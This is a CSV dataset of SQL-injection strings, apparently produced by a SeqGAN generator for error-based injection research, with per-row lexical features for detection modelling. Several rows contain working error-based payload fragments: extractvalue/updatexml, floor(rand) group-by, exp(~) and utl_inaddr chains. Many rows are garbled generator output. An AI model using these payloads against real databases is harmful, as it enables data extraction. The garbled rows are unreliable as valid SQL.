label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,1'||  (  select 'yisx,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,104,21.0,13.0,3.45852501923415,10.0,1.0,5.0,5.0,0.47619047619047616,0.047619047619047616,0.23809523809523808,0.23809523809523808,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   """" IIbs  0  0x7171706a71)  0ar  (  *2   )     ,concat  ||II"" like ""chraleedozsdmetp.rand  ||xthrhr    (  )  106  case when (  case when   (  ,concat  0  >  rand  0  #  ,1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,105,369.0,39.0,3.7744825725522477,118.0,51.0,152.0,48.0,0.31978319783197834,0.13821138211382114,0.41192411924119243,0.13008130081300814,0.0,5.0,0.0,0.0,2.0,1.0,0.0,25.0,0.0,0.0,7.0,8.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'a   6a by from 1then end  SELECT(  4232  )e  )  ||l_rastT  (  orj  (  4386  )   thenx  ||ru  6237  ||chr  0x7171706a71(  case then 1 select 1 x  )   (  )   and 0 1 1 when  (  =a   )     then union 1  5023  case when   L 1   FROM 1S   (  6237  cthen I hr  (  ||chr  (  ||ch  (  (  ,(  )       0",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,106,295.0,47.0,3.948003271500907,102.0,42.0,118.0,33.0,0.34576271186440677,0.1423728813559322,0.4,0.11186440677966102,1.0,0.0,0.0,0.0,0.0,1.0,0.0,19.0,0.0,1.0,1.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1 else by 1 where end,1  122  ||cuanr  (  5    --2   )   (  )     )   then 1  0 1 select when   then (  113  0  5840,7562  )  )   4493),0x717a767a71,floorr  ) FROM end  ,floor  (  ||chrr  (  )  )    0x78 group FROM 0 )   )  ||chr  (  select  I from6082  *,  4232  )   or)i   ( thenfrom when end  a s when R group R   A",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,107,318.0,44.0,4.1304555359433195,118.0,48.0,117.0,35.0,0.3710691823899371,0.1509433962264151,0.36792452830188677,0.11006289308176101,0.0,0.0,2.0,0.0,1.0,0.0,0.0,20.0,0.0,0.0,6.0,9.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""'  =  '%%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""3",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,108,502.0,40.0,3.64598166239922,146.0,67.0,220.0,69.0,0.2908366533864542,0.13346613545816732,0.43824701195219123,0.13745019920318724,2.0,4.0,0.0,0.0,3.0,3.0,0.0,42.0,2.0,2.0,9.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,3.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"1""   from   )    118   x   x  )     (in  ,0x717a767a71,0x717a767a71,floor  select or where FROMl  case from 2131 whenx  (  (  =tahr  (  =  ||choun.  =  =  )     )   thenchr  (  4232  (",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,109,184.0,36.0,3.9860471265249826,66.0,30.0,67.0,21.0,0.358695652173913,0.16304347826086957,0.3641304347826087,0.11413043478260869,0.0,1.0,0.0,0.0,0.0,4.0,0.0,10.0,0.0,0.0,3.0,6.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1'||  (  select 'oqlwzk. RO'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   '   WHERE DS' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||' end  0 |   SELECT by s 7158  (  0  =  )   from   R from       (  from  )   and havingST IEeesurur  (  case) and 9067 4493  9067SELECT 5023  )  )   (  having D x.t_r",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,110,548.0,55.0,4.198952921406249,175.0,103.0,206.0,64.0,0.3193430656934307,0.18795620437956204,0.3759124087591241,0.11678832116788321,6.0,0.0,0.0,0.0,0.0,4.0,0.0,35.0,0.0,1.0,11.0,9.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,2.0,4.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"1'   )     (  *2i,0x717a767a71,  )  )     )   6825 x 0  where 1 ""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""a else 3931 or 113  112  ,1   x  case   )    )   )   8877 m end  from 9067 froms(  having else  =  ||ahr  (  6237,  113  || hr  =  =  =  =  from from union (  0  select   m   SELECT AC oIT:U by    FROM xICTR.seinnt_r  (  >  chr  (  SELECT 1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,111,611.0,57.0,4.179452311143767,211.0,99.0,235.0,66.0,0.3453355155482815,0.16202945990180032,0.38461538461538464,0.10801963993453355,1.0,2.0,0.0,0.0,3.0,6.0,0.0,35.0,0.0,1.0,10.0,15.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,4.0,1.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ' 4493 else chchhr  (  case mselect   a u   where froma concat  )  6055  et  0x7171706a71   (  ,,concat  ||chr  tact_ad_res and 6913  e  )   a 7158 s    1 Eselect from and  1 and1 union >hr  )  || UM 0x717a767a71)   or x byIN' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'T,  0  =  0 4493  %concat  (  ||ICd.U C  1 from  select   )    )   =  ,1   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,112,855.0,50.0,4.160611092627492,326.0,135.0,304.0,90.0,0.38128654970760234,0.15789473684210525,0.35555555555555557,0.10526315789473684,4.0,0.0,0.0,0.0,4.0,4.0,0.0,47.0,2.0,4.0,15.0,16.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,10.0,4.0,1.0,5.0,5.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,33.0
attack,"-584015967    thenE  SELECT DISNT  (  randr  *  =     )   (  having      SELECT x group FROM x  ) when     (  select end  )  0  ||'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  's(     AND    FROM h  (  (  ||U  (  ,0x717a767a71,  a when W x  case  =    || or and or (  3440  )    )     :,floor  case 1 RO5inap orx FROM me   thenx  ||chhr  u  ,1    or  )  ||co",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,113,489.0,55.0,4.00280780661036,165.0,60.0,207.0,57.0,0.3374233128834356,0.12269938650306748,0.4233128834355828,0.1165644171779141,2.0,0.0,1.0,0.0,1.0,3.0,0.0,30.0,0.0,0.0,9.0,15.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,3.0,3.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,1%yv,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,114,4.0,4.0,2.0,2.0,1.0,0.0,1.0,0.5,0.25,0.0,0.25,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-a""   floor  =  ||rchr  0x7171706a71  106  ||cdhr  (  (  randzn  i   )     and  )  ,floor  (  || concat  rand  ||chr  (  ||ch  e_r  (  112  )  select        hohr  (  =  112  0 )    then 1  )    from 3775  select   (    ||chr  t_adhrouals   2017wbl_  (  select else else  or 1 concat  ||chr  (  0  (  =  cast",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,115,307.0,35.0,3.7423080231904717,117.0,31.0,121.0,38.0,0.3811074918566775,0.10097719869706841,0.3941368078175896,0.1237785016286645,0.0,1.0,1.0,0.0,0.0,3.0,0.0,15.0,0.0,3.0,1.0,18.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'w",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,116,211.0,29.0,3.241112162322934,47.0,32.0,103.0,29.0,0.22274881516587677,0.15165876777251186,0.4881516587677725,0.13744075829383887,2.0,0.0,0.0,0.0,1.0,1.0,0.0,20.0,0.0,0.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'f    case end  , WHERE d  eoyysauadUe_s(  *2   )     (  ,  (  *2 9067  #ainas   (hr  0x7171706a71 112  SELECT 9067 1 FROM  (  --  122  ||ui  )   or  1 x 1 dCs when1  )   and 1 or h byutl hconcat  =  5856  113,0x717a767a71,  ||chr  (  select  =  ||chr  (  (  )    )   )    )i and drou",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,117,463.0,52.0,3.9743288915588986,137.0,82.0,186.0,58.0,0.2958963282937365,0.1771058315334773,0.4017278617710583,0.12526997840172785,2.0,0.0,2.0,0.0,2.0,3.0,0.0,31.0,1.0,1.0,9.0,13.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,1.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,1.1M when   then by whenx  =hrhr  =u     )   )    )     )     )   and   WHERE  :hr  (  ||chhr  (  =  (  select cx  =x and d6913hr  (  ||chr  (  rand  SELECT RICTrhrhr  (  rand  ||rand  selectIf.UST (  ||chr  (   select )   from 1 ||   0 1 r  (  )  ||chr  from  (  ||chr  (  (  ||c,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,118,280.0,41.0,3.7747638540809128,116.0,9.0,113.0,42.0,0.4142857142857143,0.03214285714285714,0.4035714285714286,0.15,0.0,0.0,0.0,0.0,0.0,4.0,0.0,19.0,0.0,0.0,0.0,20.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1hh'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'h'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ''  (   then when  (  ||chr   a =  )   (     1 1      concat  or 0 FROM (  ||chr  (  =  0  ) )    )   union   x   WHERE 1 8488 x DLI.Tcho'touaes_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,119,687.0,53.0,3.7640337139735744,202.0,95.0,304.0,86.0,0.2940320232896652,0.13828238719068414,0.44250363901018924,0.12518195050946143,6.0,0.0,0.0,0.0,3.0,4.0,0.0,55.0,0.0,1.0,10.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,4.0,1.0,3.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,25.0
attack,"1   5606    having 7158  )  select 1 from  (  case 0 DL group AND   ,1   )   :a)    R E  *2   )    select      )   having by else  D  and  (  0  v   from else AMIyy LMC CMASNCn FROM by else  (  )    ,b  (  ||chr  rand  113  )  case union 1 x c  =  )0x717a767a71n   *  u,  6825  (   ) FROM 1 fromGGATby 1 end",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,120,307.0,51.0,4.1937807077229285,130.0,33.0,121.0,23.0,0.4234527687296417,0.10749185667752444,0.3941368078175896,0.0749185667752443,0.0,0.0,0.0,0.0,2.0,1.0,0.0,14.0,0.0,0.0,3.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%%""  =  ""' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,121,186.0,34.0,3.910011765421657,49.0,43.0,67.0,27.0,0.26344086021505375,0.23118279569892472,0.3602150537634409,0.14516129032258066,2.0,2.0,0.0,0.0,0.0,3.0,0.0,11.0,2.0,0.0,5.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""zf4493Nu' like 'jtujwb"" like ""where IMEfrom 1 FROMa x 0 union m=  ).  =  rand  case   .chgroysn(  9173  9067n2,  ||chr  select   aadddos.geds.r  (  t  =  *2  =  4232  4232  --2   )     I 6913 L    )a     ,floor     *  SELECT group by x  0  113  case by 1 by unionLcherinadzgjsdd.5t",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,122,481.0,57.0,4.298395507747734,178.0,67.0,183.0,53.0,0.3700623700623701,0.1392931392931393,0.3804573804573805,0.1101871101871102,2.0,4.0,2.0,0.0,3.0,5.0,0.0,23.0,0.0,0.0,6.0,12.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,1.0,1.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1%"" like """" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""`s.1186236   (  9067,floor  when R end  )   )    DIIsias information_schemaTNCv.NCso.chr  (  )  )   )   and or 1  cx  having a from end from FROM 1 from m4232  )   )     )   )    )    n   (  )   (  having 0 end  ||r  (  ),112  =  || 5584 when by DI concat  113  0  ||  r  (  )  ||chr  (  )  )   a IO",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,123,636.0,52.0,3.96282709823186,210.0,74.0,255.0,97.0,0.330188679245283,0.11635220125786164,0.4009433962264151,0.15251572327044025,0.0,4.0,0.0,0.0,0.0,3.0,0.0,50.0,1.0,4.0,2.0,31.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,5.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1""   (  = 0u   then or * oru1      (     ||  FROM  (  ||chr  (  ||c  select ,benchmark  =  4232  || m(  (  amv.113  )    6237,concat  (   0          )  ||chr  (  select   x   (     and    1   thencu  ,  )  ) )   then cconcat  (  (  select   t  6270  0x7171706a71,  )  )   then rand  (  select select 9173    (  case   and 1 union and D concat  113  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,124,349.0,40.0,3.702993818513702,124.0,38.0,148.0,39.0,0.3553008595988539,0.10888252148997135,0.42406876790830944,0.11174785100286533,0.0,1.0,0.0,0.0,1.0,2.0,0.0,20.0,0.0,0.0,4.0,13.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,1.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack," WNWyA  (  a else when   (  6055,floor  selectchr  (  (  ||chr  (  (  113  select 8488.M x  )    ),0x717a767a71,floor  )   SELECT or FROM m when     a dgchr  (  rand  6913  (  ),1392     106  i  ,)   cht_' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'saleys.6237q  122  SELECT AND or 1 5584 d6825a x when   (  =  (  )       )    x Gby 8488 else )   and or 1 ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,125,489.0,55.0,4.266416100746908,162.0,98.0,177.0,52.0,0.3312883435582822,0.20040899795501022,0.3619631901840491,0.10633946830265849,2.0,0.0,0.0,0.0,0.0,3.0,0.0,29.0,0.0,1.0,11.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,2.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"1%U 5483   (  #,concat  case FROM  =  113  ||cho_r  (  case union1 when   (  =  rand  )     )  >  (  ||  1 from 1 extractvalue  =     112   select whena '   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ' houn   select(  4386  ,0x78   FROM 9325chr  (  00x717a767a71,floor    )   or A||INTr.s  =  )    else from 0 6825 W  (  (  4232  (  select concat  (  113  0x7171706a71113  select113   then group unionxxu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,126,529.0,55.0,4.187395853776983,195.0,86.0,194.0,54.0,0.3686200378071834,0.16257088846880907,0.3667296786389414,0.10207939508506617,2.0,0.0,0.0,0.0,0.0,4.0,0.0,30.0,1.0,1.0,7.0,11.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1'||  (  select 'etr'  =  'lsst  (  6237,concat  extractvalue  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,127,65.0,24.0,3.9474301778513787,31.0,5.0,17.0,12.0,0.47692307692307695,0.07692307692307693,0.26153846153846155,0.18461538461538463,4.0,0.0,2.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1%,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,128,2.0,2.0,1.0,0.0,1.0,0.0,1.0,0.0,0.5,0.0,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
